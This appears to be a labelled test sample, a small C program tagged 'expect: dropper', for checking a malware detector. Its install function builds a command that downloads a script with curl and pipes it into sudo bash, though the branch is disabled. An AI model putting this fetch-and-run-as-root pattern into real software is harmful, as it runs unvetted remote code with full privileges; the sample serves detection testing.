// level: hard
// mode: dynamic
// expect: dropper
// what: an "installer" fetches a script and pipes it into a root shell (the branch is not taken here, the text is what counts)
#include <stdio.h>
#include <stdlib.h>

static int install(int network_ok) {
    char cmd[256];
    snprintf(cmd, sizeof cmd, "if %s; then curl -fsSL https://example.invalid/install.sh | sudo bash; fi",
             network_ok ? "true" : "false");
    return system(cmd);
}

int main(void) {
    return install(0);
}
